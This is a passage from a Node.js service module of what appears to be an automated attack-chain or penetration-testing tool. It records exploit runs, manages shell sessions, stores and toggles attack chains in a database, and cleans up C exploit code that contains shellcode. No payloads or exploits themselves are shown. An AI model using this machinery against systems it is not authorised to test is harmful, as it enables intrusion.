                            category: 'Exploit-Fehler',
                            title: `Fehler: ${exploit.title}`,
                            details: `Ausführung fehlgeschlagen: ${e.message}`,
                            severity: 'info'
                        });
                        if (sessionId) ShellService.killSession(sessionId);
                    } finally {
                        try {
                            if (tempFile) fs.rmSync(path.dirname(tempFile), { recursive: true, force: true });
                        } catch (err) {}
                    }
                }

                return { success: true, findings, details: `${exploits.length} Exploits versucht, ${successCount} erfolgreich` };
            }

            default:
                return { success: true, findings: [], details: `Schritt-Typ '${step.type}' übersprungen` };
        }
    }

    // Get execution history for a scan
    getExecutions(scanId) {
        const db = getDatabase();
        const execs = db.prepare(`
            SELECT ace.*, ac.name as chain_name, ac.strategy, ac.risk_level as chain_risk
            FROM attack_chain_executions ace
            JOIN attack_chains ac ON ace.chain_id = ac.id
            WHERE ace.scan_id = ?
            ORDER BY ace.started_at DESC
        `).all(scanId);

        return execs.map(e => ({
            ...e,
            results: JSON.parse(e.results_json || '[]'),
            findings: JSON.parse(e.findings_json || '[]')
        }));
    }

    // Get execution by ID
    getExecutionById(executionId) {
        const db = getDatabase();
        const exec = db.prepare(`
            SELECT ace.*, ac.name as chain_name, ac.description as chain_description, ac.strategy, ac.risk_level as chain_risk
            FROM attack_chain_executions ace
            JOIN attack_chains ac ON ace.chain_id = ac.id
            WHERE ace.id = ?
        `).get(executionId);

        if (!exec) return null;
        return {
            ...exec,
            results: JSON.parse(exec.results_json || '[]'),
            findings: JSON.parse(exec.findings_json || '[]')
        };
    }

    // Create a custom attack chain
    create(data, userId) {
        const db = getDatabase();
        const steps = data.steps || (data.steps_json ? (typeof data.steps_json === 'string' ? JSON.parse(data.steps_json) : data.steps_json) : []);
        const preconditions = data.preconditions || (data.preconditions_json ? (typeof data.preconditions_json === 'string' ? JSON.parse(data.preconditions_json) : data.preconditions_json) : []);
        const targetServices = data.targetServices || (data.target_services ? (typeof data.target_services === 'string' ? JSON.parse(data.target_services) : data.target_services) : []);
        const depthLevel = data.depthLevel || data.depth_level || data.max_depth || 2;
        const riskLevel = data.riskLevel || data.risk_level || 'medium';

        const result = db.prepare(`
            INSERT INTO attack_chains (name, description, strategy, depth_level, target_services, steps_json, preconditions_json, risk_level, enabled, created_by)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `).run(
            data.name, data.description || null,
            data.strategy || 'standard', depthLevel,
            JSON.stringify(targetServices),
            JSON.stringify(steps),
            JSON.stringify(preconditions),
            riskLevel,
            data.enabled !== false && data.enabled !== 0 ? 1 : 0,
            userId
        );
        logger.info(`Attack chain created: ${data.name} (ID: ${result.lastInsertRowid})`);
        return result.lastInsertRowid;
    }

    // Toggle chain enabled/disabled
    toggleEnabled(id) {
        const db = getDatabase();
        const chain = db.prepare('SELECT enabled FROM attack_chains WHERE id = ?').get(id);
        if (!chain) throw new Error('Attack Chain nicht gefunden');
        const newState = chain.enabled ? 0 : 1;
        db.prepare('UPDATE attack_chains SET enabled = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(newState, id);
        return newState === 1;
    }

    // Delete a chain
    delete(id) {
        const db = getDatabase();
        db.prepare('DELETE FROM attack_chain_executions WHERE chain_id = ?').run(id);
        db.prepare('DELETE FROM attack_chains WHERE id = ?').run(id);
        logger.info(`Attack chain deleted: ID ${id}`);
    }

    // Get available strategies
    getStrategies() {
        return Object.entries(this.STRATEGIES).map(([key, val]) => ({
            id: key,
            ...val
        }));
    }

    // Helper to sanitize C code with broken multiline strings
    _sanitizeCCode(code) {
        const lines = code.split(/\r?\n/);
        const outputLines = [];
        let buffer = '';
        let inString = false;

        for (let line of lines) {
            let currentContent = line;

            if (inString) {
                // If inside a string, assume the newline was accidental and join directly
                // We trim the start of the next line to remove potential indentation added by editors/tools
                // that would corrupt binary strings (shellcode) if left as spaces.
                buffer += currentContent.trimStart();
            } else {
                buffer = currentContent;
            }

            // Check quote parity of buffer (simplified parser)
            let quotes = 0;
            for (let i = 0; i < buffer.length; i++) {
                if (buffer[i] === '"') {
                    // Check escapes: count preceding backslashes
                    let backslashes = 0;
                    let j = i - 1;
                    while (j >= 0 && buffer[j] === '\\') {
                        backslashes++;
                        j--;
                    }
                    if (backslashes % 2 === 0) {
                        quotes++;
                    }
                }
            }

            if (quotes % 2 !== 0) {
                inString = true;
            } else {
                inString = false;
                outputLines.push(buffer);
                buffer = '';
            }
        }

        if (inString && buffer.length > 0) {
            outputLines.push(buffer);
        }

        return outputLines.join('\n');
    }
}

module.exports = new AttackChainService();
